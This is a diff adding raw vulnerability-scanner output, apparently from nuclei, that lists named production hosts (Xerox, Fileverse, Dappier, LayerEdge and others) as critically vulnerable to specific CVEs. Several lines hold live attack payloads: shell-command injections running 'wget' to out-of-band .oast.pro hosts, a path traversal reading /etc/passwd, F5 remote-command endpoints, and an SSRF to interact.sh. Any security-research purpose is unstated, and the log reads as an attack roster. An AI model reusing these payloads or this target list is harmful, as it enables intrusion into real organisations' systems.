@@ -1,0 +1,33 @@
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da05jlaai4kjlh8gvtbg97rg1bztbfbmg.oast.pro;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da05jlaai4kjlh8gvtbgs59rpw5ppwpkf.oast.pro;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da09rp2ai4kjlg9m3jpgebd7b8mydqxt3.oast.pro;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da09rp2ai4kjlg9m3jpgxias5r6g4zi4r.oast.pro;
+[CVE-2020-3952:version] [http] [critical] https://vlpconproxy-msp.support.xerox.com/sdk/ ["4.0.0"]
+[CVE-2020-5902] [http] [critical] https://vcm08.external.xerox.com/tmui/locallb/workspace/tmshCmd.jsp
+[CVE-2020-5902] [http] [critical] https://vcm08.external.xerox.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
+[CVE-2020-5902] [http] [critical] https://vcm08.external.xerox.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+[CVE-2021-27905] [http] [critical] https://fileshare-eu.services.xerox.com/solr/prod-2/replication/?command=fetchindex&masterUrl=https://interact.sh
+[CVE-2021-28918] [http] [critical] https://legacy-docs.across.to/?url=http://0177.0.0.1/server-status
+[CVE-2022-1388] [http] [critical] https://vcm08.external.xerox.com/mgmt/tm/util/bash
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da05jlaai4kjlh8gvtbgrgofraxm5a6mg.oast.pro;
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da09rp2ai4kjlg9m3jpgissdqc5gqerdg.oast.pro;
+[CVE-2022-26143:version] [http] [critical] https://chat.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.dev.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.staging.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2023-34048:version] [http] [critical] https://vlpconproxy-msp.support.xerox.com/sdk/ ["4.0.0"]
+[CVE-2024-45216] [http] [critical] https://fileshare-eu.services.xerox.com/solr/admin/info/properties:/admin/info/key
+[CVE-2025-54236] [http] [critical] https://chat.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.dev.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.staging.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://mcstaging.shop.xerox.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://www.shop.xerox.com/customer/address_file/upload
+[CVE-2025-55182] [http] [critical] https://dashboard.layeredge.io
+[CVE-2025-55182] [http] [critical] https://explorer.layeredge.io
+[CVE-2025-55182] [http] [critical] https://semi.explorer.layeredge.io
+[CVE-2025-55182] [http] [critical] https://znode.rivalz.ai
+[CVE-2026-21858] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-21877] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-33017] [http] [critical] https://chat.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.dev.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.staging.dappier.com/api/v1/version
+[pdf-signer-ssti-to-rce] [http] [critical] https://legacy-docs.across.to
